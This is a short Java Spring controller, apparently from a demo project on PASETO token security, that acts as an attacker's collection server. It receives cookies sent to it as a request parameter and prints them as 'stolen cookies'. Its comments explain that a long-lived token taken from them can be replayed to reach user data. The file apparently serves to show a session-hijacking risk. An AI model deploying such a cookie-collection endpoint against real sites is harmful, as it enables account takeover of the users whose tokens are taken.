package com.paseto.malicious;

import org.springframework.context.annotation.Profile;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
/**
 * Malicious server
 *
 */
@Profile("maliciousSite")
@RestController
public class MaliciousController {

    @GetMapping
    public void takeToken(@RequestParam Object c) {
        System.out.println("Stolen cookies: ");
        System.out.println(c);
        //gets all the stolen cookies. Paseto token can be extracted from here
        // The it can be to get user data from the site
        //as the server only checks if u have a token that's valid and they last for a long time
    }
}
